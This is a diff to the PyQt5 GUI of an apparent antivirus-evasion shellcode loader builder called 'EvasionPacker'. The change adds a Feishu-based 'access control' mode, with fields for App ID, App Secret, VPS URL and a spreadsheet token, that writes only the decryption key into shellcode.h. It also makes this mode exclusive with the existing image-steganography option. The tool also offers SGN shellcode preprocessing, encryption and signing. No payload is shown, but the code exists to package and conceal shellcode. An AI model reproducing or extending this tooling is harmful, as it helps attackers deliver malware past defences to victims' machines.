@@ -10,7 +10,7 @@ from Crypto.Util.Padding import pad
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QHBoxLayout, QLabel, QComboBox, QCheckBox, 
                            QPushButton, QGroupBox, QFileDialog, QMessageBox,
-                           QLineEdit)
+                           QLineEdit, QGridLayout, QSizePolicy)
 from PyQt5.QtCore import QThread, pyqtSignal,Qt
 
 class CompileThread(QThread):
@@ -189,19 +189,45 @@ class MainWindow(QMainWindow):
         except Exception as e:
             QMessageBox.warning(self, "警告", f"更新版本信息失败：{str(e)}")
             return False
+    
+    def toggle_access_control_fields(self, state):
+        """根据准入控制复选框的状态切换相关字段的可见性"""
+        self.access_control_group.setVisible(state == Qt.Checked)
+        
+        # 添加互斥控制：当启用准入控制时，禁用图片隐写
+        if state == Qt.Checked:
+            self.steg_check.setChecked(False)
+            self.steg_check.setEnabled(False)
+        else:
+            self.steg_check.setEnabled(True)
+            
+    def on_steg_check_changed(self, state):
+        """当图片隐写复选框状态改变时的处理"""
+        # 添加互斥控制：当启用图片隐写时，禁用准入控制
+        if state == Qt.Checked:
+            self.access_control_check.setChecked(False)
+            self.access_control_check.setEnabled(False)
+        else:
+            self.access_control_check.setEnabled(True)
+
     def init_ui(self):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         layout = QVBoxLayout(central_widget)
         layout.setSpacing(20)  
         layout.setContentsMargins(20, 20, 20, 20)  
+        # 修改Shellcode加密设置区域的高度和布局
         encryption_group = QGroupBox("Shellcode加密设置")
-        encryption_group.setFixedHeight(150)  
-        encryption_layout = QVBoxLayout()
-        encryption_layout.setSpacing(5)
+        encryption_group.setFixedHeight(120)  
+        encryption_layout = QHBoxLayout()  
+        encryption_layout.setSpacing(10)
         encryption_layout.setContentsMargins(10, 10, 10, 10)
+        
+        # 左侧垂直布局放置复选框和加密方式
+        left_layout = QVBoxLayout()
         self.sgn_check = QCheckBox("启用SGN预处理shellcode")
-        encryption_layout.addWidget(self.sgn_check)
+        left_layout.addWidget(self.sgn_check)
+        
         enc_method_layout = QHBoxLayout()
         enc_method_layout.setSpacing(5)  
         enc_method_label = QLabel("加密方式:")
@@ -209,8 +235,11 @@ class MainWindow(QMainWindow):
         self.encryption_combo.addItems(self.config_manager.encryption_methods)
         enc_method_layout.addWidget(enc_method_label)
         enc_method_layout.addWidget(self.encryption_combo)
-        encryption_layout.addLayout(enc_method_layout)
+        left_layout.addLayout(enc_method_layout)
         
+        encryption_layout.addLayout(left_layout, 1)
+        
+        # 右侧放置文件选择
         file_layout = QHBoxLayout()
         file_layout.setSpacing(5)  
         self.file_path = QLineEdit()
@@ -219,7 +248,8 @@ class MainWindow(QMainWindow):
         browse_btn.clicked.connect(self.browse_file)
         file_layout.addWidget(self.file_path)
         file_layout.addWidget(browse_btn)
-        encryption_layout.addLayout(file_layout)
+        
+        encryption_layout.addLayout(file_layout, 2)  # 文件选择区域占更多空间
         encryption_group.setLayout(encryption_layout)
         layout.addWidget(encryption_group)
 
@@ -255,6 +285,7 @@ class MainWindow(QMainWindow):
         
         steg_layout = QHBoxLayout()
         self.steg_check = QCheckBox("启用图片隐写")
+        self.steg_check.stateChanged.connect(self.on_steg_check_changed)  
         self.steg_name = QLineEdit()  
         self.steg_name.setFixedWidth(60)  
         self.steg_name.setText("1.png")  
@@ -274,8 +305,54 @@ class MainWindow(QMainWindow):
         payload_control_layout.addWidget(self.payloadControl_check)
         sign_layout.addLayout(payload_control_layout)
     
-        output_file_layout = QHBoxLayout()
+        access_control_layout = QHBoxLayout()
+        self.access_control_check = QCheckBox("启用准入控制")
+        self.access_control_check.setToolTip("基于飞书,启用后只写入密钥到shellcode.h")
+        self.access_control_check.stateChanged.connect(self.toggle_access_control_fields)
+        access_control_layout.addWidget(self.access_control_check)
+        sign_layout.addLayout(access_control_layout)
 
+        # 添加准入控制相关字段
+        self.access_control_group = QGroupBox("准入控制配置")
+        self.access_control_group.setVisible(False)  # 默认隐藏
+        access_control_fields_layout = QGridLayout()  
+        access_control_fields_layout.setSpacing(5)
+        
+        # App ID
+        app_id_label = QLabel("App ID:")
+        self.app_id_edit = QLineEdit()
+        access_control_fields_layout.addWidget(app_id_label, 0, 0)
+        access_control_fields_layout.addWidget(self.app_id_edit, 0, 1)
+        
+        # App Secret
+        app_secret_label = QLabel("App Secret:")
+        self.app_secret_edit = QLineEdit()
+        access_control_fields_layout.addWidget(app_secret_label, 1, 0)
+        access_control_fields_layout.addWidget(self.app_secret_edit, 1, 1)
+        
+        # VPS URL
+        vps_url_label = QLabel("VPS URL:")
+        self.vps_url_edit = QLineEdit()
+        access_control_fields_layout.addWidget(vps_url_label, 0, 2)
+        access_control_fields_layout.addWidget(self.vps_url_edit, 0, 3)
+        
+        # Sheet ID
+        sheet_id_label = QLabel("Sheet ID:")
+        self.sheet_id_edit = QLineEdit()
+        access_control_fields_layout.addWidget(sheet_id_label, 1, 2)
+        access_control_fields_layout.addWidget(self.sheet_id_edit, 1, 3)
+        
+        spreadsheet_token_label = QLabel("Spreadsheet Token:")
+        self.spreadsheet_token_edit = QLineEdit()
+        access_control_fields_layout.addWidget(spreadsheet_token_label, 2, 0)
+        access_control_fields_layout.addWidget(self.spreadsheet_token_edit, 2, 1, 1, 3) 
+
+        self.access_control_group.setLayout(access_control_fields_layout)
+        sign_layout.addWidget(self.access_control_group)
+        
+        # 设置合理的大小策略
+        self.access_control_group.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
+        self.access_control_group.setMaximumHeight(100)  # 限制最大高度
 
         output_file_layout = QHBoxLayout()
         self.output_path = QLineEdit()
@@ -488,6 +565,8 @@ class MainWindow(QMainWindow):
                 icon_dest = os.path.join(current_dir, "..", "Loader", "icon.ico")
                 shutil.copy2(self.icon_path.text(), icon_dest)
             
+            settings = self.config_manager.get_settings_from_ui(self)
+            
             if self.steg_check.isChecked():
                 steg_filename = self.steg_name.text() if self.steg_name.text() else "shellcode_steg.png"
                 steg_output = os.path.join(current_dir, "..", "Loader", steg_filename)
@@ -499,10 +578,13 @@ class MainWindow(QMainWindow):
                     steg_output
                 )
                 QMessageBox.information(self, "提示", f"隐写图片已生成到：{steg_output}")
+            elif self.access_control_check.isChecked():
+                # 启用准入控制，只写入密钥信息
+                self.config_manager.save_to_header_key_only()
+                QMessageBox.information(self, "提示", "已启用准入控制，请自行搭建准入bot")
             else:
                 self.config_manager.save_to_header(encrypted_data)
             
-            settings = self.config_manager.get_settings_from_ui(self)
             self.config_manager.update_config(settings)
 
             sln_path = os.path.normpath(os.path.join(current_dir, "..", "Loader", "EvasionPacker.sln"))
@@ -550,3 +632,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
